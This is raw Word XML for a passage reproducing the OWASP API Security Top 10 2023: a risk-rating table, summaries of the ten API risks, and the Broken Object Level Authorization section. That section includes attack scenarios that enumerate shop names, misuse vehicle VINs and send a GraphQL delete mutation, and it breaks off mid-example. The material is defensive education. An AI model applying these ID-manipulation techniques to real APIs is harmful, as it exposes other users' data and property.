          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:color w:val="0000FF"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>OWASP Risk Rating Methodology</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0080304A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> was used to do the risk analysis.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"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The table below summarizes the terminology associated with the risk score.</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1676"/>
        <w:gridCol w:w="2031"/>
        <w:gridCol w:w="2270"/>
        <w:gridCol w:w="2324"/>
        <w:gridCol w:w="1977"/>
        <w:gridCol w:w="1842"/>
      </w:tblGrid>
      <w:tr w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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lastRenderedPageBreak/>
              <w:t>Threat Agents</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Exploitability</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Weakness Prevalence</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Weakness Detectability</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Technical Impact</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Business Impacts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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 Specific</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Easy: </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</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Widespread </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</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Easy </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</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Severe </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</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Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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 Specific</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Average: </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>2</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Common </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>2</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Average </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>2</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Moderate </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>2</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Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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 Specific</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Difficult: </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</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Difficult </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</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Difficult </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</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Minor </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>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Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Note</w:t>
      </w:r>
      <w:r w:rsidRPr="0080304A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w: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does not take into account the actual impact on your business. Your organization will have to decide how much security risk from applications and APIs the organization is willing to accept given your culture, industry, and regulatory environment. The purpose of the OWASP API Security Top 10 is not to do this risk analysis for you. Since this edition is not data-driven, prevalence results from a consensus among the team members.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="300" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="lowKashida"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0080304A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>OWASP Top 10 API Security Risks –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7031"/>
      </w:tblGrid>
      <w:tr w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblHeade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Risk</w:t>
            </w:r>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b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0080304A">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Description</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7" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API1:2023 - Broken Object Level Authorization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APIs tend to expose endpoints that handle object identifiers, creating a wide attack surface of Object Level Access Control issues. Object level authorization checks should be considered in every function that accesses a data source using an ID from the user.</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8" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API2:2023 - Broken Authentication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Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or to exploit implementation flaws to assume other user's identities temporarily or permanently. Compromising a system's ability to identify the client/user, compromises API security overall.</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9" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API3:2023 - Broken Object Property Level Authorization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This category combines </w:t>
            </w:r>
            <w:hyperlink r:id="rId10" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API3:2019 Excessive Data Exposure</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="0080304A">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> and </w:t>
            </w:r>
            <w:hyperlink r:id="rId11" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API6:2019 - Mass Assignment</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="0080304A">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>, focusing on the root cause: the lack of or improper authorization validation at the object property level. This leads to information exposure or manipulation by unauthorized parties.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2" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API4:2023 - Unrestricted Resource Consumption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Satisfying API requests requires resources such as network bandwidth, CPU, memory, and storage. Other resources such as emails/SMS/phone calls or biometrics validation are made available by service providers via API integrations, and paid for per request. Successful attacks can lead to Denial of Service or an increase of operational costs.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3" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API5:2023 - Broken Function Level Authorization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Complex access control policies with different hierarchies, groups, and roles, and an unclear separation between administrative and regular functions, tend to lead to authorization flaws. By exploiting these issues, attackers can gain access to other users’ resources and/or administrative functions.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4" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API6:2023 - Unrestricted Access to Sensitive Business Flows</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APIs vulnerable to this risk expose a business flow - such as buying a ticket, or posting a comment - without compensating for how the functionality could harm the business if used excessively in an automated manner. This doesn't necessarily come from implementation bugs.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5" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API7:2023 - Server Side Request Forgery</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Server-Side Request Forgery (SSRF) flaws can occur when an API is fetching a remote resource without validating the user-supplied URI. This enables an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall or a VPN.</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6" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API8:2023 - Security Misconfiguration</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APIs and the systems supporting them typically contain complex configurations, meant to make the APIs more customizable. Software and DevOps engineers can miss these configurations, or don't follow security best practices when it comes to configuration, opening the door for different types of attacks.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7" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API9:2023 - Improper Inventory Management</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APIs tend to expose more endpoints than traditional web applications, making proper and updated documentation highly important. A proper inventory of hosts and deployed API versions also are important to mitigate issues such as deprecated API versions and exposed debug endpoints.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2284"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hyperlink r:id="rId18" w:history="1">
              <w:r w:rsidRPr="00790A44">
                <w:rPr>
                  <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                  <w:color w:val="0000FF"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>API10:2023 - Unsafe Consumption of APIs</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6986" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="lowKashida"/>
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0080304A">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Developers tend to trust data received from third-party APIs more than user input, and so tend to adopt weaker security standards. In order to compromise APIs, attackers go after integrated third-party services instead of trying to compromise the target API directly.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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API1:2023 Broken Object Level Authorization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919"/>
        <w:gridCol w:w="4481"/>
        <w:gridCol w:w="3720"/>
      </w:tblGrid>
      <w:tr w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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80304A" w:rsidRPr="00790A44" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Widespread</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Moderate</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidTr="0080304A">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Attackers can exploit API endpoints that are vulnerable to broken object-level authorization by manipulating the ID of an object that is sent within the request. Object IDs can be anything from sequential integers, UUIDs, or generic strings. Regardless of the data type, they are easy to identify in the request target (path or query string parameters), request headers, or even as part of the request payload.</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This issue is extremely common in API-based applications because the server component usually does not fully track the client’s state, and instead, relies more on parameters like object IDs, that are sent from the client to decide which objects to access. The server response is usually enough to understand whether the request was successful.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
            <w:pPr>
              <w:jc w:val="lowKashida"/>
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Unauthorized access to other users’ objects can result in data disclosure to unauthorized parties, data loss, or data manipulation. Under certain circumstances, unauthorized access to objects can also lead to full account takeover.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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Object level authorization is an access control mechanism that is usually implemented at the code level to validate that a user can only access the objects that they should have permissions to access.</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Every API endpoint that receives an ID of an object, and performs any action on the object, should implement object-level authorization checks. The checks should validate that the logged-in user has permissions to perform the requested action on the requested object.</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Failures in this mechanism typically lead to unauthorized information disclosure, modification, or destruction of all data.</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Comparing the user ID of the current session (e.g. by extracting it from the JWT token) with the vulnerable ID parameter isn't a sufficient solution to solve Broken Object Level Authorization (BOLA). This approach could address only a small subset of cases.</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In the case of BOLA, it's by design that the user will have access to the vulnerable API endpoint/function. The violation happens at the object level, by manipulating the ID. If an attacker manages to access an API endpoint/function they should not have access to - this is a case of </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          </w:rPr>
          <w:t>Broken Function Level Authorization</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> (BFLA) rather than BOLA.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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80304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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e-commerce platform for online stores (shops) provides a listing page with the revenue charts for their hosted shops. Inspecting the browser requests, an attacker can identify the API endpoints used as a data source for those charts and their pattern: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/shops/{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shopName</w:t>
      </w:r>
      <w:proofErr w:type="spell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revenue_data.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>. Using another API endpoint, the attacker can get the list of all hosted shop names. With a simple script to manipulate the names in the list, replacing </w:t>
      </w:r>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shopName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> in the URL, the attacker gains access to the sales data of thousands of e-commerce stores.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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automobile manufacturer has enabled remote control of its vehicles via a mobile API for communication with the driver's mobile phone. The API enables the driver to remotely start and stop the engine and lock and unlock the doors. As part of this flow, the user sends the Vehicle Identification Number (VIN) to the API. The API fails to validate that the VIN represents a vehicle that belongs to the logged in user, which leads to a BOLA vulnerability. An attacker can access vehicles that don't belong to him.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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#3</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An online document storage service allows users to view, edit, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>store</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> and delete their documents. When a user's document is deleted, a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>GraphQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> mutation with the document ID is sent to the API.</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lastRenderedPageBreak/>
        <w:t>POST /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>graphql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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operationName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gram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deleteReports</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>",</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variables</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":{</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reportKeys</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":["&lt;DOCUMENT_ID&gt;"]</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query</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
